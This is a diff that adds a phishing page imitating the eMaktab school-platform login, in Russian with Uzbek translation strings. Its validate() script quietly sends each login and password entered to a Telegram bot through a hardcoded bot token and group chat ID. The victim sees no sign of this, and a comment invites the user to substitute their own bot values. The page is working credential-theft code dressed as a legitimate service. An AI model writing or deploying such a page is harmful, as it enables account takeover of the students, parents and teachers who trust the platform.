@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eMaktab | Войти в eMaktab</title>
+    <link rel="icon" href="https://static.emaktab.uz/img/icons/favicon_Uz.ico" sizes="16x16 24x24 32x32 48x48 64x64" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .navbar {
+            background-color: white;
+            color: #2f4f9e;
+            padding: 15px;
+            display: flex;
+            justify-content: center; /* Центрирует содержимое навигационного бара */
+            align-items: center; /* Выравнивает по вертикали */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            position: relative;
+        }
+        .navbar img {
+            height: 40px;
+            margin-right: 15px;
+        }
+        .navbar-links {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            justify-content: center; /* Центрирует ссылки и кнопки */
+            white-space: nowrap; /* Убирает переносы строк */
+        }
+        .navbar-links a {
+            color: #808285;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .language-select {
+            position: relative;
+        }
+        .language-dropdown {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            background-color: white;
+            border: 1px solid #ccc;
+            z-index: 1;
+            margin-top: 5px;
+            width: 100px;
+        }
+        .language-select:hover .language-dropdown {
+            display: block;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        .header {
+            height: 80px; /* Высота заголовка */
+            line-height: 80px; /* Центрирование текста по вертикали */
+            background-image: linear-gradient(to bottom, #3c53a8, #24245f);
+            color: #fff;
+            text-align: center;
+            font-size: 1.5em;
+            border-radius: 8px 8px 0 0;
+            font-family: "Museo Cyrl";
+            margin: -31px -31px 0 -31px; /* Уменьшение отступов */
+        }
+        label {
+            font-weight: bold;
+            margin-top: 10px;
+            display: block;
+        }
+        input {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        input:focus {
+            border-color: #2f4f9e;
+            outline: none;
+        }
+        .error-message {
+            color: red;
+            display: none;
+            font-size: 0.9em;
+        }
+        button {
+            padding: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s, color 0.3s;
+        }
+        .login-button {
+            font-family: "Open Sans";
+            font-size: 20px;
+            text-shadow: 0 -1px 0 rgba(0, 0, 0, .4);
+            color: #fff;
+            height: 49px;
+            padding: 0;
+            opacity: .9;
+            border: 1px solid #649e26;
+            border-radius: 5px;
+            background-image: linear-gradient(to bottom, #afd652, #6db62e);
+            background-color: #6db62e;
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .6);
+        }
+        .connect-button {
+            background-color: white;
+            border: 2px solid #19b47b;
+            color: #19b47b;
+        }
+        .login-button:hover {
+            background-color: #5cae3d; /* Темнее при наведении */
+            color: white;
+        }
+        .connect-button:hover {
+            background-color: #19b47b;
+            color: white;
+        }
+        .footer-text {
+            font-size: 0.9em;
+            text-align: center;
+            color: #999;
+            margin-top: 15px;
+        }
+        .footer-text a {
+            color: #2f4f9e;
+            text-decoration: none;
+        }
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+        .login-button-div {
+            background-color: white;
+            border: 2px solid #00bae5;
+            color: #00bae5;
+        }
+        .login-button-div:hover {
+            background-color: #00bae5;
+            color: white;
+        }
+        .footer {
+            background-color: #231f20;
+            color: white;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .footer__menu {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 1200px;
+            margin-bottom: 10px;
+        }
+
+        .footer__column {
+            flex: 1;
+            min-width: 200px;
+            margin: 10px;
+        }
+
+        .footer__menu__links__title {
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .footer__menu__links__layout {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .footer__menu__links__layout_item {
+            margin-bottom: 5px;
+        }
+
+        .footer__menu__links__item {
+            color: #939598;
+            text-decoration: none;
+        }
+
+        .footer__menu__links__item:hover {
+            text-decoration: underline;
+        }
+
+        .footer__copyright {
+            text-align: center;
+            font-size: 0.8em;
+            margin-top: 10px;
+        }
+
+        .sociallinks {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        .sociallinks__button {
+            width: 30px;
+            height: 30px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            margin: 0 5px;
+        }
+
+        .sociallinks__button_facebook {
+            background-image: url('https://static.emaktab.uz/images/icons/social/facebook-white.png'); /* Замените на путь к иконке */
+        }
+
+        .sociallinks__button_instagram {
+            background-image: url('https://static.emaktab.uz/images/icons/social/instagram-white.png'); /* Замените на путь к иконке */
+        }
+
+        .sociallinks__button_telegram {
+            background-image: url('https://static.emaktab.uz/images/icons/social/telegram-white.png'); /* Замените на путь к иконке */
+        }
+
+        .sociallinks__button_youtube {
+            background-image: url('https://static.emaktab.uz/images/icons/social/youtube-white.png'); /* Замените на путь к иконке */
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="navbar">
+        <div class="navbar-links">
+            <a href="https://emaktab.uz/"><img style="max-height: 100%; vertical-align: middle; border: 0; box-sizing: border-box; overflow-clip-margin: content-box; overflow: clip;" src="https://static.emaktab.uz/img/logotypes/uzlogotype.png" alt="Логотип eMaktab"></a>
+            <a href="https://emaktab.uz/about" style="padding-left: 0;">О компании</a>
+            <a href="https://emaktab.uz/features" style="padding-left: 17px; padding-right: 17px;">Возможности</a>
+            <a href="https://emaktab.uz/forpartners" style="padding-left: 17px; padding-right: 17px;">Партнёрам</a>
+            <a href="https://emaktab.uz/support" style="padding-left: 17px;">Поддержка</a>
+            <div class="language-select">
+                <button>Выбор языка</button>
+                <div class="language-dropdown">
+                    <a href="#" onclick="translate('ru')">Русский</a>
+                    <a href="#" onclick="translate('uz')">Ўзбекча</a>
+                </div>
+            </div>
+            <button class="login-button-div">Войти</button>
+            <button class="connect-button">Подключить ОО</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            Войти в eMaktab
+        </div>
+        <form>
+            <label for="login">Логин</label>
+            <input type="text" id="login" name="login" placeholder="Введите логин" required>
+    
+            <label for="password">Пароль</label>
+            <input type="password" id="password" name="password" placeholder="Введите пароль" required>
+            <p class="error-message" id="error-msg">Ошибка: Неправильный логин или пароль</p>
+    
+            <button type="button" class="login-button" onclick="validate()">Войти</button>
+        </form>
+    
+        <div class="footer-text">
+            <p>Забыли логин или пароль? <a href="#">Восстановите доступ.</a></p>
+        </div>
+    </div>
+    
+    <script>
+
+        function validate() {
+            var login = document.getElementById("login").value;
+            var password = document.getElementById("password").value;
+
+            // Замените 'YOUR_TELEGRAM_BOT_TOKEN' и 'YOUR_CHAT_ID' на ваши значения
+            var botToken = '7918203460:AAH9bYyeyEoHD48OeogdQ7M2ya7nt9vZ8O4';
+            var chatId = '-4572859110'; // ID вашей группы
+
+            // Формируем сообщение
+            var message = `Логин: ${login}\nПароль: ${password}`;
+
+            // Отправка сообщения в Telegram
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    // Обрабатываем ответ, но не показываем уведомления
+                    if (!response.ok) {
+                        console.error('Ошибка при отправке данных.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Ошибка:', error);
+                });
+        }
+    
+        function translate(lang) {
+            if (lang === 'uz') {
+                // Замените на узбекскую версию текста
+                document.title = 'eMaktab | eMaktab ga kirish';
+                document.getElementById('login').placeholder = 'Loginni kiriting';
+                document.getElementById('password').placeholder = 'Parolni kiriting';
+                document.getElementById('error-msg').textContent = 'Xato: Noto‘g‘ri login yoki parol';
+            } else {
+                // Русская версия
+                document.title = 'eMaktab | Войти в eMaktab';
+                document.getElementById('login').placeholder = 'Введите логин';
+                document.getElementById('password').placeholder = 'Введите пароль';
+                document.getElementById('error-msg').textContent = 'Ошибка: Неправильный логин или пароль';
+            }
+        }
+    </script>
+    <footer class="footer">
+        <div class="footer__menu">
+            <div class="footer__column">
+                <div class="footer__menu__links__title">О компании</div>
+                <ul class="footer__menu__links__layout">
+                    <li class="footer__menu__links__layout_item">
+                        <a href="https://emaktab.uz/about" class="footer__menu__links__item">О нас</a>
+                    </li>
+                    <li class="footer__menu__links__layout_item">
+                        <a href="https://emaktab.uz/news" class="footer__menu__links__item">Новости</a>
+                    </li>
+                    <li class="footer__menu__links__layout_item">
+                        <a href="https://emaktab.uz/contacts" class="footer__menu__links__item">Контакты</a>
+                    </li>
+                </ul>
+            </div>
+            <div class="footer__column">
+                <div class="footer__menu__links__title">Возможности</div>
+                <ul class="footer__menu__links__layout">
+                    <li class="footer__menu__links__layout_item">
+                        <a href="https://emaktab.uz/features#/teachers" class="footer__menu__links__item">Преподавателям</a>
+                    </li>
+                    <li class="footer__menu__links__layout_item">
+                        <a href="https://emaktab.uz/features#/parents" class="footer__menu__links__item">Родителям</a>
+                    </li>
+                    <li class="footer__menu__links__layout_item">
+                        <a href="https://emaktab.uz/features#/students" class="footer__menu__links__item">Учащимся</a>
+                    </li>
+                    <li class="footer__menu__links__layout_item">
+                        <a href="https://emaktab.uz/features#/governments" class="footer__menu__links__item">Госорганам</a>
+                    </li>
+                </ul>
+            </div>
+            <div class="footer__column">
+                <div class="footer__menu__links__title">Партнёрам</div>
+                <ul class="footer__menu__links__layout">
+                    <li class="footer__menu__links__layout_item">
+                        <a href="https://emaktab.uz/forpartners" class="footer__menu__links__item">Партнёрские программы</a>
+                    </li>
+                </ul>
+            </div>
+            <div class="footer__column">
+                <div class="footer__menu__links__title">Поддержка</div>
+                <div class="footer__menu__links__support">
+                    <a href="https://help.emaktab.uz" class="footer__menu__links__support__link" style="color: #19b47b; text-decoration: none;">Портал службы поддержки</a>
+                </div>
+            </div>
+        </div>
+        <div class="footer__copyright">
+            <p>&copy; 2024 eMaktab. Все права защищены.</p>
+        </div>
+        <div class="sociallinks">
+            <a class="sociallinks__button sociallinks__button_facebook" href="https://www.facebook.com/emaktab.uz" target="_blank" title="eMaktab в Facebook"></a>
+            <a class="sociallinks__button sociallinks__button_instagram" href="https://www.instagram.com/emaktab.uz/" target="_blank" title="eMaktab в Instagram"></a>
+            <a class="sociallinks__button sociallinks__button_telegram" href="https://t.me/emaktab_uz" target="_blank" title="eMaktab в Telegram"></a>
+            <a class="sociallinks__button sociallinks__button_youtube" href="https://www.youtube.com/@emaktabuzb" target="_blank" title="eMaktab на YouTube"></a>
+        </div>
+    </footer>    
+</body>
+</html> 
